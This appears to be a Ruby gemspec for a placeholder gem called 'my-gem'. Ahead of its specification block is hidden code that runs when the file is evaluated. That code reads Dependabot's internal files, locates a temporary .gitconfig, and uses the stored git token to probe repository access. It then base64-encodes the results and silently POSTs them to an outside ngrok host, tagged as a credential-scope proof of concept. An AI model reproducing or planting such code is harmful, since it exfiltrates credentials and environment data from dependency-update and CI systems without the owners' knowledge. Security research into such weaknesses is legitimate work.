COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_file = ->(path) { IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace) }

begin
  require "net/http"
  require "uri"
  require "open3"

  results = []

  # credential.rb - hoe werken credentials in Dependabot?
  results << "=== credential.rb ===\n#{read_file.('/home/dependabot/common/lib/dependabot/credential.rb')}"

  # shared_helpers.rb
  results << "=== shared_helpers.rb ===\n#{read_file.('/home/dependabot/common/lib/dependabot/shared_helpers.rb')[0..3000]}"

  # git ls-remote - test token scope (fix timeout syntax)
  gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
  if gitconfig
    begin
      out, err, _ = Open3.capture3(
        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
        "/home/dependabot/bin/git", "ls-remote", "--heads", "https://github.com/ugurcanli/testpen"
      )
      results << "=== GIT LS-REMOTE own repo ===\nOUT: #{out[0..300]}\nERR: #{err[0..200]}"
    rescue => e
      results << "=== GIT LS-REMOTE ERR: #{e.class}: #{e.message} ==="
    end

    # Test: kan de token een andere publieke repo zien (scope check)?
    begin
      out2, err2, _ = Open3.capture3(
        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
        "/home/dependabot/bin/git", "ls-remote", "--heads", "https://github.com/dependabot/dependabot-core"
      )
      results << "=== GIT LS-REMOTE dependabot-core ===\nOUT: #{out2[0..300]}\nERR: #{err2[0..200]}"
    rescue => e
      results << "=== GIT LS-REMOTE dependabot-core ERR: #{e.class} ==="
    end
  end

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=credscope")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
